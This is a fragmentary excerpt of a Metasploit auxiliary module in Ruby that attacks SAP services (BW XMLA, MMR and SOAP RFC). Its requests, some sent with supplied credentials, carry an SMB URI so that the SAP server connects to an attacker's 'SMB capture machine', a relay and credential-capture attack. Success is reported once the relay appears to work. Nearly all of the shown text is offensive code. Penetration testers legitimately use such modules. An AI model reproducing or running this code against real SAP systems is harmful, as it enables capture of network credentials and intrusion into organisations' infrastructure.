...
class MetasploitModule < Msf::Auxiliary
  ...
  def run_xmla
    if !valid_credentials?
      vprint_error("Credentials needed in order to abuse the SAP BW service")
      return
    end
    ...
    begin
      print_status("Sending request for #{smb_uri}")
      ...
      if res && (res.code == 200) && res.body =~ /XML for Analysis Provider/ && res.body =~ /Request transfered is not a valid XML/
        print_good("SMB Relay looks successful, check your SMB capture machine")
      elsif res
        vprint_status("Response: #{res.code} - #{res.message}")
      end
  ...
  def run_mmr
    ...
    if datastore['HttpUsername'].empty?
      vprint_status("Sending unauthenticated request for #{smb_uri}")
      ...
      vprint_status("Sending authenticated request for #{smb_uri}")
      res = send_request_cgi({
        'uri' => '/mmr/MMR',
        'method' => 'GET',
        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
  ...
  def send_soap_rfc_request(data, smb_uri)
    if !valid_credentials?
      vprint_error("Credentials needed in order to abuse the SAP SOAP RFC service")
      return
    end

    begin
      vprint_status("Sending request for #{smb_uri}")
      res = send_request_cgi({
        'uri' => '/sap/bc/soap/rfc',
        'method' => 'POST',
        'data' => data,
